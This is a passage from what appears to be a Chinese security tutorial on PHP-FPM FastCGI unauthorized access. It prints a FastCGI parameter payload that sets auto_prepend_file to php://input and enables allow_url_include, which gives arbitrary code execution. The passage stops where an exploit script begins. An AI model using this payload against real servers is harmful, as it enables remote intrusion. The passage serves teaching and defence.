&lt;p&gt;正确的解决方法有两种，一是在 Nginx 端使用 &lt;code&gt;fastcgi_split_path_info&lt;/code&gt;  将 path info 信息去除后，用 tryfiles 判断文件是否存在；二是借助 PHP-FPM 的 &lt;code&gt;security.limit_extensions&lt;/code&gt;  配置项，避免其他后缀文件被解析。&lt;/p&gt;
&lt;h4 id=&#34;fastcgi-未授权访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fastcgi-未授权访问&#34;&gt;#&lt;/a&gt; fastcgi 未授权访问&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;PHP-FPM 默认监听 9000 端口，如果这个端口暴露在公网，则我们可以自己构造 fastcgi 协议，和 fpm 进行通信。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SCRIPT_FILENAME&lt;/code&gt;  的值就格外重要了。因为 fpm 是根据这个值来执行 php 文件的，如果这个文件不存在，fpm 会直接返回 404：&lt;/p&gt;
&lt;p&gt;由于设置了 security.limit_extensions，其限定了只有某些后缀的文件允许被 fpm 执行，默认是 &lt;code&gt;.php&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;由于这个配置项的限制，如果想利用 PHP-FPM 的未授权访问漏洞，首先就得找到一个已存在的 PHP 文件。&lt;/p&gt;
&lt;p&gt;我们可以找找默认源安装后可能存在的 php 文件，比如 &lt;code&gt;/usr/local/lib/php/PEAR.php&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;PHP.INI 中有两个有趣的配置项， &lt;code&gt;auto_prepend_file&lt;/code&gt;  和 &lt;code&gt;auto_append_file&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;auto_prepend_file&lt;/code&gt;  是告诉 PHP，在执行目标文件之前，先包含 &lt;code&gt;auto_prepend_file&lt;/code&gt;  中指定的文件； &lt;code&gt;auto_append_file&lt;/code&gt;  是告诉 PHP，在执行完成目标文件后，包含 &lt;code&gt;auto_append_file&lt;/code&gt;  指向的文件。&lt;/p&gt;
&lt;p&gt;那么就有趣了，假设我们设置 &lt;code&gt;auto_prepend_file&lt;/code&gt;  为 &lt;code&gt;php://input&lt;/code&gt; ，那么就等于在执行任何 php 文件前都要包含一遍 POST 的内容。所以，我们只需要把待执行的代码放在 Body 中，他们就能被执行了。（当然，还需要开启远程文件包含选项 &lt;code&gt;allow_url_include&lt;/code&gt; ）&lt;/p&gt;
&lt;p&gt;那么，我们怎么设置 &lt;code&gt;auto_prepend_file&lt;/code&gt;  的值？&lt;/p&gt;
&lt;p&gt;这又涉及到 PHP-FPM 的两个环境变量， &lt;code&gt;PHP_VALUE&lt;/code&gt;  和 &lt;code&gt;PHP_ADMIN_VALUE&lt;/code&gt; 。这两个环境变量就是用来设置 PHP 配置项的， &lt;code&gt;PHP_VALUE&lt;/code&gt;  可以设置模式为 &lt;code&gt;PHP_INI_USER&lt;/code&gt;  和 &lt;code&gt;PHP_INI_ALL&lt;/code&gt;  的选项， &lt;code&gt;PHP_ADMIN_VALUE&lt;/code&gt;  可以设置所有选项。（ &lt;code&gt;disable_functions&lt;/code&gt;  除外，这个选项是 PHP 加载的时候就确定了，在范围内的函数直接不会被加载到 PHP 上下文中）&lt;/p&gt;
&lt;p&gt;所以，我们最后传入如下环境变量：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;GATEWAY_INTERFACE&amp;#x27;: &amp;#x27;FastCGI/1.0&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;REQUEST_METHOD&amp;#x27;: &amp;#x27;GET&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SCRIPT_FILENAME&amp;#x27;: &amp;#x27;/var/www/html/index.php&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SCRIPT_NAME&amp;#x27;: &amp;#x27;/index.php&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;QUERY_STRING&amp;#x27;: &amp;#x27;?a=1&amp;amp;b=2&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;REQUEST_URI&amp;#x27;: &amp;#x27;/index.php?a=1&amp;amp;b=2&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;DOCUMENT_ROOT&amp;#x27;: &amp;#x27;/var/www/html&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SERVER_SOFTWARE&amp;#x27;: &amp;#x27;php/fcgiclient&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;REMOTE_ADDR&amp;#x27;: &amp;#x27;127.0.0.1&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;REMOTE_PORT&amp;#x27;: &amp;#x27;12345&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SERVER_ADDR&amp;#x27;: &amp;#x27;127.0.0.1&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SERVER_PORT&amp;#x27;: &amp;#x27;80&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SERVER_NAME&amp;#x27;: &amp;quot;localhost&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;SERVER_PROTOCOL&amp;#x27;: &amp;#x27;HTTP/1.1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;PHP_VALUE&amp;#x27;: &amp;#x27;auto_prepend_file = php://input&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;PHP_ADMIN_VALUE&amp;#x27;: &amp;#x27;allow_url_include = On&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;设置 &lt;code&gt;auto_prepend_file = php://input&lt;/code&gt;  且 &lt;code&gt;allow_url_include = On&lt;/code&gt; ，然后将我们需要执行的代码放在 Body 中，即可执行任意代码。&lt;/p&gt;
&lt;p&gt;利用脚本：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;187&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;188&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;189&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;190&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;191&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;193&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;194&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;195&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;196&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;197&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;198&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;199&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;200&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;201&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;202&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;203&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;204&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;205&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;206&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;207&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;208&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;209&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;210&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;211&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;212&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;213&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;214&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;215&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;216&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;217&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;218&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;219&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;220&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;221&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;222&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;223&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;224&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;225&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;226&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;227&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;228&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;229&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;230&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;231&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;232&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;233&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;234&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;235&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;236&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;237&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;238&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;239&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;240&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;241&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;242&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;243&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;244&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;245&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;246&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;247&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;248&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;249&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;250&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;251&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;252&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;253&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;254&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;255&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; socket&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; random&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; argparse&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; io &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; 